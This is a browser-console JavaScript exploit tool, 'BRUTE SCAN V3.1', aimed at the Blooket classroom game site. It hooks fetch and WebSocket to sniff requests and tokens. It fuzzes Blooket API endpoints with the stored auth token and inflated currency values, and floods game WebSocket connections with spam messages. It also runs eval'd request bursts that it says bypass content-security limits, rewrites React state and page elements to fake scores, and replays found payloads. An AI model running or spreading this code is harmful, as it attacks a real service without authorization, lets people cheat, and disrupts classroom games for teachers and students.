(async () => {
    if (document.getElementById('BRUTE_SCAN')) return console.log('Already scanning!');

    console.log('%c BRUTE SCAN V3.1 | BLOOKET EXPLOIT %c\n\tUnleashed Chaos - March 26, 2025 | Ben Stewart’s Moderator Test', 'color: #ff00ff; font-size: 2rem; font-weight: bold', '');

    const style = document.createElement('style');
    style.innerHTML = `
        #BRUTE_SCAN { position: fixed; top: 10px; left: 10px; width: 500px; height: 600px; background: #111; z-index: 99999; color: #0f0; padding: 15px; font-family: monospace; overflow-y: auto; border: 2px solid #ff00ff; box-shadow: 0 0 20px #ff00ff; }
        .scanBtn { padding: 10px; margin: 5px 0; background: #333; cursor: pointer; transition: all 0.2s; }
        .scanBtn:hover { background: #ff00ff; color: #000; transform: scale(1.05); }
        #stopFuzzBtn, #stopExploitBtn { padding: 10px; margin: 5px 0; background: #f00; cursor: pointer; display: none; }
        #stopFuzzBtn:hover, #stopExploitBtn:hover { background: #ff5555; }
        #logArea { height: 450px; overflow-y: auto; margin-top: 10px; border-top: 1px solid #0f0; padding-top: 5px; }
        #stats { color: #ff0; font-size: 0.9rem; margin-bottom: 10px; }
    `;
    document.head.appendChild(style);

    const gui = document.createElement('div');
    gui.id = 'BRUTE_SCAN';
    const stats = document.createElement('div');
    stats.id = 'stats';
    const logArea = document.createElement('div');
    logArea.id = 'logArea';
    gui.append(stats, logArea);
    document.body.appendChild(gui);

    let hits = 0, misses = 0, wsConnections = 0, potentials = [];
    const updateStats = () => stats.innerText = `Hits: ${hits} | Misses: ${misses} | WS Active: ${wsConnections} | Potentials: ${potentials.length}`;

    const origLog = console.log;
    console.log = (...args) => {
        origLog(...args);
        logArea.innerHTML += `<div>${new Date().toISOString()} - ${args.join(' ')}</div>`;
        logArea.scrollTop = logArea.scrollHeight;
    };

    console.log('The API Fuzzer 2.1 By Alastair-Appazzola on github!');
    const origFetch = window.fetch;
    window.fetch = async (url, opts) => {
        if (url.includes('blooket.com')) {
            console.log('Sniffed Fetch:', { url, headers: opts.headers, body: opts.body });
            if (opts.body) {
                try {
                    const parsed = JSON.parse(opts.body);
                    if (parsed.token || parsed.amount || parsed.crypto) {
                        console.log('Potential Crypto Hack payload:', parsed);
                        potentials.push({ url, method: opts.method || 'POST', body: parsed });
                    }
                } catch {}
            }
        }
        return origFetch(url, opts);
    };

    const liveWSUrls = new Set();
    const origWS = window.WebSocket;
    window.WebSocket = function(url) {
        if (url.includes('blooket.com')) {
            console.log('Sniffed WS Attempt:', url);
            liveWSUrls.add(url);
        }
        const ws = new origWS(url);
        ws.onopen = () => { wsConnections++; updateStats(); console.log('WS Hit:', url); };
        ws.onerror = () => { console.log('WS Miss:', url); };
        ws.onclose = () => { wsConnections--; updateStats(); };
        ws.onmessage = (msg) => console.log('WS Data:', url, msg.data);
        return ws;
    };

    const fuzzEndpoints = async (base) => {
        const prefixes = ['/api', '/v1', '/v2', '/game', '/play', '/user', '/stats', '/live'];
        const actions = ['tokens', 'users', 'games', 'state', 'update', 'session', 'player', 'auth', 'cheat', 'crypto'];
        const params = ['?id=', '?token=', '?amount=', '?key=', '?crypto='];
        const endpoints = [];
        for (const prefix of prefixes) {
            for (const action of actions) {
                endpoints.push(`${base}${prefix}/${action}`);
                params.forEach(p => endpoints.push(`${base}${prefix}/${action}${p}${Math.random().toString(36).slice(2)}`));
            }
        }
        return endpoints;
    };

    let abortFuzz = false, abortExploit = false;

    const tests = [
        {
            name: 'Vuln Scan in APIs',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'scanBtn';
                btn.innerText = 'Vuln Scan in APIs';
                const stopBtn = document.createElement('div');
                stopBtn.id = 'stopFuzzBtn';
                stopBtn.innerText = 'STOP SCANNING';
                stopBtn.onclick = () => { abortFuzz = true; stopBtn.style.display = 'none'; console.log('API scan aborted!'); };
                btn.onclick = async () => {
                    abortFuzz = false;
                    stopBtn.style.display = 'block';
                    const tokenGuess = localStorage.token || `${Math.random().toString(36).slice(2)}`;
                    const bases = ['https://api.blooket.com', 'https://play.blooket.com', 'https://dashboard.blooket.com'];
                    for (const base of bases) {
                        const endpoints = await fuzzEndpoints(base);
                        console.log(`Scanning ${base} with ${endpoints.length} API checks...`);
                        for (const url of endpoints) {
                            if (abortFuzz) break;
                            console.log('Checking:', url);
                            try {
                                const res = await fetch(url, {
                                    method: Math.random() > 0.5 ? 'POST' : 'GET',
                                    headers: { 
                                        'Authorization': tokenGuess,
                                        'Content-Type': 'application/json',
                                        'X-Fuzz': 'BRUTE_SCAN_V3.1'
                                    },
                                    body: JSON.stringify({ amount: 9999, tokens: 9999, crypto: 9999, cheat: true })
                                });
                                if (res.ok) {
                                    hits++;
                                    const data = await res.json();
                                    console.log(`Found vuln at ${url}:`, data);
                                    if (data.token || data.amount || data.crypto) potentials.push({ url, method: 'POST', body: { amount: 9999, tokens: 9999, crypto: 9999 } });
                                } else {
                                    misses++;
                                    console.log(`No vuln at ${url}:`, res.status);
                                }
                            } catch (e) {
                                misses++;
                                console.log(`Missed ${url}:`, e.message);
                            }
                            await new Promise(r => setTimeout(r, 100));
                        }
                        if (abortFuzz) break;
                    }
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                gui.append(btn, stopBtn);
            }
        },
        {
            name: 'Blast Game Connections',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'scanBtn';
                btn.innerText = 'Blast Game Connections';
                btn.onclick = async () => {
                    const wsBases = ['wss://play.blooket.com', 'wss://api.blooket.com', 'wss://dashboard.blooket.com'];
                    const wsPaths = ['/ws', '/socket', '/game', '/live', '/play', '/cheat', '/crypto'];
                    const tokenGuesses = [
                        localStorage.token || 'guest',
                        'Bearer ' + Math.random().toString(36).slice(2),
                        btoa(JSON.stringify({ id: 'brute', ts: Date.now() }))
                    ];
                    const liveUrls = liveWSUrls.size ? Array.from(liveWSUrls) : [];
                    console.log('Live Crypto Hack WS sniffed:', liveUrls);
                    const targets = liveUrls.length ? liveUrls : wsBases.flatMap(base => wsPaths.map(path => `${base}${path}`));
                    console.log(`Blasting ${targets.length} connections with ${tokenGuesses.length} keys...`);
                    targets.forEach(url => {
                        tokenGuesses.forEach(token => {
                            const fullUrl = `${url}?token=${encodeURIComponent(token)}&rand=${Math.random()}`;
                            console.log('Blasting:', fullUrl);
                            let retries = 5;
                            const connect = () => {
                                const ws = new WebSocket(fullUrl);
                                ws.onopen = () => {
                                    wsConnections++;
                                    console.log('Connected:', fullUrl, '—spamming Crypto Hack...');
                                    const flood = setInterval(() => {
                                        if (ws.readyState === 1) ws.send(JSON.stringify({ 
                                            type: ['cheat', 'auth', 'update', 'crypto'][Math.floor(Math.random() * 4)], 
                                            tokens: 9999, crypto: 9999, chaos: Math.random() 
                                        }));
                                        else clearInterval(flood);
                                    }, 100);
                                };
                                ws.onerror = () => {
                                    if (retries--) setTimeout(connect, 1000);
                                };
                                ws.onmessage = (msg) => console.log('Crypto Hack WS response:', fullUrl, msg.data);
                            };
                            connect();
                        });
                    });
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'Stealth Proxy Chaos',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'scanBtn';
                btn.innerText = 'Stealth Proxy';
                btn.onclick = () => {
                    const tokenGuess = localStorage.token || 'guest';
                    const proxyCode = `
                        const urls = Array(50).fill().map((_, i) => 
                            'https://' + ['api', 'play', 'dashboard'][i % 3] + '.blooket.com/api/' + 
                            ['tokens', 'games', 'stats', 'update', 'crypto'][i % 5] + '?rand=' + Math.random()
                        );
                        let hits = 0;
                        urls.forEach(url => {
                            fetch(url, {
                                method: 'POST',
                                headers: { 
                                    'Authorization': '${tokenGuess}',
                                    'Content-Type': 'application/json',
                                    'X-Stealth': 'BRUTE_SCAN_V3.1'
                                },
                                body: JSON.stringify({ amount: 9999, tokens: 9999, crypto: 9999, chaos: true })
                            })
                            .then(res => res.ok ? res.json() : Promise.reject(res.status))
                            .then(data => { console.log('Stealth Hit:', url, data); hits++; })
                            .catch(e => console.log('Stealth Miss:', url, e));
                        });
                        setTimeout(() => console.log('Stealth Proxy Done - Hits:', hits), 5000);
                    `;
                    eval(proxyCode); // CSP allows 'unsafe-eval'—bypass Blob block
                    console.log('Stealth proxy unleashed via eval!');
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'Obliterate State/DOM',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'scanBtn';
                btn.innerText = 'Obliterate State';
                btn.onclick = () => {
                    const reactRoot = window._reactRootContainer || window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.get(1)?.getFiberRoot();
                    if (reactRoot) {
                        let stateNode = reactRoot.current;
                        const mutate = (node) => {
                            if (node.memoizedState) {
                                for (let key in node.memoizedState) {
                                    if (typeof node.memoizedState[key] === 'number' && (key.includes('token') || key.includes('crypto') || key.includes('point'))) {
                                        node.memoizedState[key] = 9999999 + Math.floor(Math.random() * 1000);
                                        console.log(`Mutated ${key} to`, node.memoizedState[key]);
                                    }
                                }
                            }
                            if (node.child) mutate(node.child);
                            if (node.sibling) mutate(node.sibling);
                        };
                        mutate(stateNode);
                        console.log('Crypto Hack state obliterated—check the chaos!');
                    }
                    const domTargets = document.querySelectorAll('[class*="token"], [class*="crypto"], [class*="point"], [class*="score"]');
                    domTargets.forEach((el, i) => {
                        el.textContent = `999999${i}`;
                        el.style.color = '#ff00ff';
                        console.log('DOM Nuked:', el);
                    });
                };
                gui.appendChild(btn);
            }
        },
        {
            name: 'Exploit Potentials',
            run: () => {
                const btn = document.createElement('div');
                btn.className = 'scanBtn';
                btn.innerText = 'Exploit Potentials';
                const stopBtn = document.createElement('div');
                stopBtn.id = 'stopExploitBtn';
                stopBtn.innerText = 'STOP EXPLOITING';
                stopBtn.onclick = () => { abortExploit = true; stopBtn.style.display = 'none'; console.log('Exploit aborted!'); };
                btn.onclick = async () => {
                    if (!potentials.length) return console.log('No potentials yet—scan first!');
                    abortExploit = false;
                    stopBtn.style.display = 'block';
                    for (const { url, method, body } of potentials) {
                        if (abortExploit) break;
                        console.log(`Exploiting Crypto Hack at ${url}`);
                        try {
                            const res = await fetch(url, {
                                method: method || 'POST',
                                headers: { 'Authorization': localStorage.token || 'guest', 'Content-Type': 'application/json' },
                                body: JSON.stringify({ ...body, amount: 999999, tokens: 999999, crypto: 999999 })
                            });
                            if (res.ok) {
                                hits++;
                                console.log(`Exploit SUCCESS at ${url}:`, await res.json());
                            } else {
                                misses++;
                                console.log(`Exploit failed at ${url}:`, res.status);
                            }
                        } catch (e) {
                            misses++;
                            console.log(`Exploit error at ${url}:`, e.message);
                        }
                        await new Promise(r => setTimeout(r, 200));
                    }
                    stopBtn.style.display = 'none';
                    updateStats();
                };
                gui.append(btn, stopBtn);
            }
        }
    ];

    tests.forEach(test => {
        console.log(`Armed: ${test.name}`);
        test.run();
    });

    document.querySelectorAll('#BRUTE_SCAN:not(:last-child)').forEach(el => el.remove());
})();
